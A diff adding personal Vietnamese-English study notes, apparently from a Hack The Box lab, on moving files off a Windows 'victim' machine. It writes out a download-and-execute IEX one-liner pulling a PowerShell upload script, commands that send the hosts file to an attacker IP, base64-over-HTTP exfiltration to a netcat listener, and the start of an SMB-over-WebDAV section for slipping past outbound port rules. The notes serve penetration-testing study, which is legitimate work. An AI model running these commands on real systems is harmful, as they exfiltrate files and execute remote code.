@@ -185,3 +185,82 @@ Decode file
   
   naruto3co@htb[/htb]$ md5sum hosts 
   3688374325b992def12793500307566d  hosts
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+PowerShell Web Uploads
+
+Trực tiếp Powershell không có hàm upload nhưng nó thề là nền móng viết lên hàm upload bằng ivnvoke-WebRequest hoặc Invoke-RestMethod
+We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities. ( ý này mình chưa clear lắm, cần thực hành để hiểu được) nhưng có thể dùng python http.server để làm server
+
+Installing a Configured WebServer with Upload
+  naruto3co@htb[/htb]$ pip3 install uploadserver
+    Collecting upload server
+      Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+    Installing collected packages: uploadserver
+    Successfully installed uploadserver-2.0.1
+
+  naruto3co@htb[/htb]$ python3 -m uploadserver
+    File upload available at /upload
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+Giờ ta có thể sử dụng Powershell dùng invoke-RestMethod để thực hiện upload file hệ thống. Script cho phép 2 tham số -File và -Uri 
+
+  PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+  PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+  
+  [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
+  [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+
+Another way..... 
+
+PowerShell + base64 encode file 
+  Condition : using Invoke or Invoke RestMethod  + Netcat 
+              ( use Netcat listen port specify and send file as POST request)
+
+Victim
+  PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+  PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+
+Attacker
+  naruto3co@htb[/htb]$ nc -lvnp 8000
+  
+  listening on [any] 8000 ...
+  connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
+  POST / HTTP/1.1
+  User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+  Content-Type: application/x-www-form-urlencoded
+  Host: 192.168.49.128:8000
+  Content-Length: 1820
+  Connection: Keep-Alive
+         IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
+    ...SNIP...
+
+  naruto3co@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Tất nhiên rồi , cứ nhắc đến chuyển file méo gì ông em SMB cũng dính dáng 
+
+SMB Uploads  
+
+Các công ty thường chỉ open port 80 và 443 outbound chứ k dùng SMB 445. Theo bài viết của microsoft (https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)
+
+Vậy giải pháp thay thế là SMB trên port 80 hoặc 443 bằng cách WebDav.WevDAV ( https://datatracker.ietf.org/doc/html/rfc4918 ) Nó là extension của HTTP. WebDAV cho phép webserver có khả năng giống như file server dùng trên HTTP và cả HTTPS 
+
+Khi dùng SMB, điều đầu tiên cần làm là kết nối tới phương thức SMB và nếu k tồn tại SMB share. Có thể thử dùng HTTP cho phép Wireshark capture,  và chỉ thấy đang dùng giao thức HTTP thay vì SMB ( cái này tôi méo hiểu lắm nhưng ae nên xem hình ) 
+
+Cấu hình WebDav server 
+
+
+
+
+
+
+
+
+
+
+
+
